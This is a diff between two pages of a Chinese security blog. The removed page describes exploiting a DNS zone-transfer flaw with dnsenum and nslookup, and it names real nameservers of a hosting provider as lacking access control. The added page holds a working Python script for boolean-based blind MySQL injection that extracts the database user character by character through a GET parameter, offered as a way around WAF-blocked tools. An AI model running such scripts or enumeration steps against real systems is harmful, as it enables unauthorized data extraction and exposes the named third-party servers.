@@ -64,7 +64,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="python," />
 
 
 
@@ -80,44 +80,28 @@
 
 
 
-<meta name="description" content="其实利用方法分为手工和工具两种，我们可以利用BT5下面的工具Dnsenum或者是其它工具，手工的话就利用nslookup即可。
-1、使用工具来获取DNS信息
-cd /pentest/enumeration/dns/dnsenum
-
-# ./dnsenum.pl –enum domain.com
-这样就可以简单的利用了。
-2、使用手工的方法，推荐。方法如下图
-查询过程如图所显示:
-查询结果保存在18">
+<meta name="description" content="当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在
+[python]
+#! usr/bin/env python
+-- coding: utf-8 --import httplibimport timeimport stringimport sysimport randomimport urllib
+headers = {‘User-Agent’: ‘Mozil">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DNS域传送漏洞利用方法">
-<meta property="og:url" content="http://yoursite.com/2015/07/13/dns-e5-9f-9f-e4-bc-a0-e9-80-81-e6-bc-8f-e6-b4-9e-e5-88-a9-e7-94-a8-e6-96-b9-e6-b3-95/index.html">
+<meta property="og:title" content="Mysql布尔盲注脚本">
+<meta property="og:url" content="http://yoursite.com/2015/07/15/Mysql布尔盲注脚本/index.html">
 <meta property="og:site_name" content="wps2015的博客">
-<meta property="og:description" content="其实利用方法分为手工和工具两种，我们可以利用BT5下面的工具Dnsenum或者是其它工具，手工的话就利用nslookup即可。
-1、使用工具来获取DNS信息
-cd /pentest/enumeration/dns/dnsenum
-
-# ./dnsenum.pl –enum domain.com
-这样就可以简单的利用了。
-2、使用手工的方法，推荐。方法如下图
-查询过程如图所显示:
-查询结果保存在18">
-<meta property="og:image" content="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/1259002Mo.jpg">
-<meta property="og:image" content="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/125900JRF.jpg">
-<meta property="og:image" content="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/125901P6x.jpg">
+<meta property="og:description" content="当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在
+[python]
+#! usr/bin/env python
+-- coding: utf-8 --import httplibimport timeimport stringimport sysimport randomimport urllib
+headers = {‘User-Agent’: ‘Mozil">
 <meta property="og:updated_time" content="2016-04-13T01:36:32.903Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="DNS域传送漏洞利用方法">
-<meta name="twitter:description" content="其实利用方法分为手工和工具两种，我们可以利用BT5下面的工具Dnsenum或者是其它工具，手工的话就利用nslookup即可。
-1、使用工具来获取DNS信息
-cd /pentest/enumeration/dns/dnsenum
-
-# ./dnsenum.pl –enum domain.com
-这样就可以简单的利用了。
-2、使用手工的方法，推荐。方法如下图
-查询过程如图所显示:
-查询结果保存在18">
-<meta name="twitter:image" content="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/1259002Mo.jpg">
+<meta name="twitter:title" content="Mysql布尔盲注脚本">
+<meta name="twitter:description" content="当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在
+[python]
+#! usr/bin/env python
+-- coding: utf-8 --import httplibimport timeimport stringimport sysimport randomimport urllib
+headers = {‘User-Agent’: ‘Mozil">
 
 
 
@@ -135,7 +119,7 @@ cd /pentest/enumeration/dns/dnsenum
   };
 </script>
 
-  <title> DNS域传送漏洞利用方法 | wps2015的博客 </title>
+  <title> Mysql布尔盲注脚本 | wps2015的博客 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -275,7 +259,7 @@ cd /pentest/enumeration/dns/dnsenum
             
             
               
-                DNS域传送漏洞利用方法
+                Mysql布尔盲注脚本
               
             
           </h1>
@@ -287,8 +271,8 @@ cd /pentest/enumeration/dns/dnsenum
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-07-13T11:10:37+08:00" content="2015-07-13">
-              2015-07-13
+            <time itemprop="dateCreated" datetime="2015-07-15T22:00:44+08:00" content="2015-07-15">
+              2015-07-15
             </time>
           </span>
 
@@ -301,8 +285,8 @@ cd /pentest/enumeration/dns/dnsenum
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/漏洞利用/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞利用</span>
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
                   </a>
                 </span>
 
@@ -334,28 +318,13 @@ cd /pentest/enumeration/dns/dnsenum
       
 
       
-        <p>其实利用方法分为手工和工具两种，我们可以利用BT5下面的工具Dnsenum或者是其它工具，手工的话就利用nslookup即可。</p>
-<p><strong>1、使用工具来获取DNS信息</strong></p>
-<p><strong>cd /pentest/enumeration/dns/dnsenum
-</strong></p>
-<p><strong># ./dnsenum.pl –enum domain.com</strong></p>
-<p>这样就可以简单的利用了。</p>
-<p><strong>2、使用手工的方法，推荐。</strong>方法如下图</p>
-<p>查询过程如图所显示:</p>
-<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/1259002Mo.jpg" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/1259002Mo.jpg" alt="1259002Mo"></a><br>查询结果保存在189store.com.txt中<br>使用如下指令查看</p>
-<p><div id="crayon-55a203d21a436168482616" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
-<p><div class="crayon-toolbar" data-settings=" show"></div></p>
-<p><div class="crayon-tools"></div></p>
-<p><div class="crayon-button crayon-nums-button crayon-pressed" title="切换是否显示行编号"></div></p>
-<p><pre class="brush: actionscript3; gutter: true">&lt;span class=&quot;crayon-i&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;189store.com.txt&lt;/span&gt;</pre><br></p>
-<p><div class="crayon-button crayon-copy-button" title="复制代码"></div><br><br><br><br>有74条记录</p>
-<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/125900JRF.jpg" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/125900JRF.jpg" alt="125900JRF"></a></p>
-<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/125901P6x.jpg" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/125901P6x.jpg" alt="125901P6x"></a></p>
-<p>&nbsp;</p>
-<h3 id="漏洞证明："><a href="#漏洞证明：" class="headerlink" title="漏洞证明："></a>漏洞证明：</h3><p>见上面的详细说明</p>
-<h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><p>ns.westidc.com.cn（221.236.9.9） 与 ns.westidc.net.cn（210.77.146.30） 都没有做访问控制<br>定义ACL(访问控制列表)来限制在域名服务器之间的区域传送<br>编辑/etc/named.conf<br>在189store.com的zone配置中设置</p>
-<p><pre class="brush: shell; gutter: true">allow-transfer { localhost; 221.236.9.9; };</pre><br>或</p>
-<p><pre class="brush: shell; gutter: true">allow-transfer { localhost; 210.77.146.30; };</pre><br>原文：<a href="http://www.waitalone.cn/post/DNSTransfer.html" target="_blank" rel="external">http://www.waitalone.cn/post/DNSTransfer.html</a></p>
+        <p>当某个盲注点不能使用工具（一般有waf限制）的时候，可以使用这个脚本用于证明漏洞的存在</p>
+<p>[python]</p>
+<p>#! usr/bin/env python</p>
+<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import httplib<br>import time<br>import string<br>import sys<br>import random<br>import urllib</p>
+<p>headers = {‘User-Agent’: ‘Mozilla/5.0 Chrome/28.0.1500.63’,}<br>payloads = list(‘abcdefghijklmnopqrstuvwxyz0123456789@_.’)<br>print ‘start to retrive MySQL user:’<br>user = ‘’<br>for i in range(1,21):<br>    for payload in payloads:<br>        conn = httplib.HTTPConnection(‘www.example.com’, timeout=4)      #连接,host<br>        s = “ascii(mid(lower(user()),%s,1))=%s” % (i, ord(payload))       #payload<br>        conn.request(method=’GET’,url=”/php/1.php?id=1 and %s” % s,headers = headers)  #url<br>        html_header= conn.getresponse().read()<br>        length=len(html_header)<br>        if length&gt;10000:<br>            user+=payload<br>            sys.stdout.write(‘\r[In progress] %s’ % user)<br>            sys.stdout.flush()<br>            break<br>        else:<br>            print ‘.’,<br>            conn.close()</p>
+<p>print ‘\n[Done]MySQL user is’, user</p>
+<p>[/python]</p>
 
       
     </div>
@@ -374,21 +343,27 @@ cd /pentest/enumeration/dns/dnsenum
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/python/" rel="tag">#python</a>
+          
+        </div>
+      
 
       
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/06/18/python-unicode-e5-ad-97-e8-8a-82-e4-b8-b2-e8-bd-ac-e6-88-90-e4-b8-ad-e6-96-87-e9-97-ae-e9-a2-98-ef-bc-88-e8-bd-ac-ef-bc-89/" rel="next" title="python unicode字节串转成中文问题  （转）">
-                <i class="fa fa-chevron-left"></i> python unicode字节串转成中文问题  （转）
+              <a href="/2015/07/15/业务安全漏洞挖掘归纳总结/" rel="next" title="业务安全漏洞挖掘归纳总结">
+                <i class="fa fa-chevron-left"></i> 业务安全漏洞挖掘归纳总结
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/07/15/e4-b8-9a-e5-8a-a1-e5-ae-89-e5-85-a8-e6-bc-8f-e6-b4-9e-e6-8c-96-e6-8e-98-e5-bd-92-e7-ba-b3-e6-80-bb-e7-bb-93/" rel="prev" title="业务安全漏洞挖掘归纳总结">
-                业务安全漏洞挖掘归纳总结 <i class="fa fa-chevron-right"></i>
+              <a href="/2015/09/29/关于服务器的host绑定的不安全因素/" rel="prev" title="关于服务器的host绑定的不安全因素">
+                关于服务器的host绑定的不安全因素 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -503,7 +478,7 @@ cd /pentest/enumeration/dns/dnsenum
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞证明："><span class="nav-number">1.</span> <span class="nav-text">漏洞证明：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复方案："><span class="nav-number">2.</span> <span class="nav-text">修复方案：</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#coding-utf-8"><span class="nav-number">1.</span> <span class="nav-text">-- coding: utf-8 --</span></a></li></ol></div>
             
           </div>
         </section>
